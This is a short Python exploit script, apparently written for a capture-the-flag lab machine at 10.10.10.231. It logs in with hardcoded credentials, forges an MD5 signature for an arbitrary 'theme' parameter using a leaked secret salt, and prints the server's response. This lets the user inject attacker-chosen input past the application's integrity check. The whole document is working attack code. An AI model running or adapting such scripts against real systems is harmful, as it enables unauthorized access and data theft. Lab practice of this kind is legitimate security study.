from hashlib import md5
from sys import argv
from urllib.parse import quote_plus
import requests as r

s = r.session()
url = 'http://10.10.10.231/licenses/'
data = {"username": "vikki.solomon@throwaway.mail", "password": "password1"}
s.post(url, data=data)  # login
theme_param = argv[1]
hash = md5(b"hie0shah6ooNoim" + theme_param.encode('utf-8')).hexdigest()
rspn = s.get(f'{url}licenses.php?theme={quote_plus(theme_param)}&h={hash}')
head, sep, tail = rspn.text.partition('<body>')
print(head)

s.close()

